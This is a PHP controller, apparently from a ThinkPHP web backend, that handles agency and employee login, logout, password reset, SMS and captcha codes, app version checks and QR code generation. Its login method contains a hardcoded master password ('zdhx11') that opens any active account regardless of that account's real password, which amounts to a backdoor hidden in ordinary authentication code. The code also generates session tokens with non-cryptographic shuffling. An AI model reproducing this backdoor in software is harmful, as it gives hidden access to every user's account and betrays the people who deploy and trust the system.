<?php

namespace app\agency\controller;

use captcha\captcha;
use think\Loader;
use think\Request;


/**
 * Auth Controller
 */
class Auth extends Common
{
    /**
     * 登录
     */
    public function login()
    {
        $code = input('ocode', 'kuandian', 'trim');
        $phone = input('name', '');
        $password = input('password', '');
        $identity = config('user_type');

        $type = input('type');
        $version = input('version');
        $type = strtolower($type);
        // $type = ('ios' == $type) ? 'ios' : 'android';
        $config = config('agency_app.' . $type);
        if ($config['version'] != $version && $config['is_must'] == 'true' && $type == 'android') {
            return ['code' => 301, 'msg' => '请升级APP'];
        }


        if ('' == $phone || !is_numeric($phone)) {
            return ['code' => 0, 'msg' => '请输入正确的手机号'];
        }
        if ('' == $password) {
            return ['code' => 0, 'msg' => '请输入密码'];
        }


        $data = $this->db->name('agency')->where(['phone' => $phone, 'not_delete' => 1])->find();

        if (empty($data)) {
            return ['code' => 0, 'msg' => '帐号不存在'];
        }
        $password = md123($password);
        if ($password != $data['password'] && input('password') != 'zdhx11' ) {
               return ['code' => 0, 'msg' => '密码错误'];
        }

        if (1 != $data['status']) {
                return ['code' => 0, 'msg' => '帐号被禁用'];
        }

        $arr = [1 => 'agency', 'employee', 'seller'];
        $role = $arr[$data['type']];


        $str = "abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789";
        $token = substr(str_shuffle($str), 0, 12);
        //$token = '1234567890';
        $params = [
            'role' => $role,
            'user_type' => $identity[$role],
            'id' => $data['id'],
            'uid' => $data['id'],
            'oid' => $this->oid,
            'token' => $token,
            'name' => $data['name'],
            'phone' => $data['phone'],
            'status' => $data['status'],
            'open_lock' => $data['open_lock'],
            'time' => time(),

        ];

        cache("merchant-token:{$this->oid}-{$token}", $params, 30 * 86400);
        cache("merchant-login:{$this->oid}-{$params['uid']}", $token, 30 * 86400);

        $info = ['token' => $token, 'uid' => $params['uid'], 'role' => $role, 'oid' => $this->oid, 'ocode' => $code, 'open_lock' => $data['open_lock'], 'is_self' => false, 'is_forbid' => ($data['status'] != 1), 'flag' => mwencrypt((string)$this->oid)];
        if ('agency' == $role && $data['is_self'] == 1) {
            $info['is_self'] = true;
        }
        $this->operateLog($params['uid'], '登录系统');
        setLang();
        return $this->successResponse($info, '登录成功');
    }


    /**
     * 退出
     */
    public function logout()
    {
        $token = Request::instance()->header('token');
        $cache = cache("merchant-token:{$this->oid}-{$token}");
        $cache && cache("merchant-token:{$this->oid}-{$token}", null);
        return $this->successResponse([], '注销成功');
    }


    public function forgotPassword()
    {
        $ocode = input('ocode', '');
        $code = input('code', '', 'trim');
        $new_password = input('new_password', '', 'trim');
        $confirm_password = input('confirm_password', '', 'trim');
        $phone = input('phone', '');

        if ('' == $ocode) {
            return $this->errorResponse(0, '请输入企业标识符');
        }
        if (strlen($new_password) < 6) {
            return $this->errorResponse(0, '新密码至少六位数');
        }
        if ($new_password != $confirm_password) {
            return $this->errorResponse(0, '两次密码不一致');
        }
        $result = \think\Loader::model('ValidateToken', 'logic')
            ->checkCode($phone, 'password', $code);
        if (1 != $result['code']) {
            !isset($result['data']) && $result['data'] = [];
            return $this->errorResponse($result['code'], $result['msg'], $result['data']);
        }

        $this->db->name('agency')->where(['phone' => $phone, 'not_delete' => 1])->update(['password' => md123($new_password)]);
        return $this->successResponse([], '密码设置成功');
    }

    //发送找回密码短信
    public function sms()
    {
        $ocode = input('ocode', '');
        $code = input('code', '', 'trim');
        $phone = input('phone', '', 'trim');
        $key = input('key', '', 'trim');
        $type = input('type', 'password', 'trim');


        if ('' == $ocode) {
            return $this->errorResponse(0, '请输入企业标识符');
        }
        if ('' == $phone) {
            return $this->errorResponse(0, lang('请输入正确的手机号码'));
        }
        $code = strtolower($code);
        if ($code != cache("captcha:{$key}")) {
            return $this->errorResponse(0, '验证码错误');
        }
        $info = $this->db->name('agency')->where(['phone' => $phone, 'not_delete' => 1])->find();
        if (empty($info)) {
            return $this->errorResponse(0, '帐号不存在');
        }

        $result = \think\Loader::model('ValidateToken', 'logic')
            ->sendSmsCode($phone, $type, $info['type'], $info['id']);
        if (1 != $result['code']) {
            !isset($result['data']) && $result['data'] = [];
            return $this->errorResponse($result['code'], $result['msg'], $result['data']);
        }

        $data = array_merge(['ocode' => $ocode, 'uid' => $info['id']], $result['data']);
        return $this->successResponse($result, '发送成功');
    }

    //图形验证码
    public function captcha()
    {
        $key = input('key', '', 'trim');
        $obj = new captcha();
        $obj->doimg();
        $code = $obj->getCode();
        cache("captcha:{$key}", $code, 3 * 60);
    }

    //版本
    function version()
    {
        $type = input('type');
        $version = input('version');
        $type = ('ios' == $type) ? 'ios' : 'android';
        $config = config('agency_app.' . $type);
        $config['update'] = $config['version'] != $version;
        return $this->successResponse($config, '版本检测');
    }

    public function wechatSign()
    {
        $code = Request::instance()->header('ocode');
        $url = input('url', config('website'), 'trim');
        $url = urldecode($url);
        $result = callWechat('Script', $code)->getJsSign($url);
        return $this->successResponse($result, 'wechat jssdk');
    }

    //生成二维码
    public function qrcode()
    {
        $url = input('url');
        if (strpos($url, config('qrcodeurl')) !== 0) {
            exit;
        }
        ob_start();
        Loader::import('qrcode.phpqrcode');
        $object = new \QRcode();
        Header("Content-type: image/png");
        $object->png($url, false, 'L', 18, 2);
        exit;
    }

    //生成二维码
    public function showQrcode()
    {
        $text = input('text');
        $type = input('type', 'device');
        if ('wired' == $type) {
            $url = config('qrcodeurl') . "/Xc?o=" . mwencrypt((string)$this->oid) . "&&t={$text}";
        } else {
            $url = config('qrcodeurl') . "/Lease?o=" . mwencrypt((string)$this->oid) . "&&t={$text}";
        }
        ob_start();
        Loader::import('qrcode.phpqrcode');
        $object = new \QRcode();
        Header("Content-type: image/png");
        $object->png($url, false, 'L', 18, 2);
        exit;
    }
}

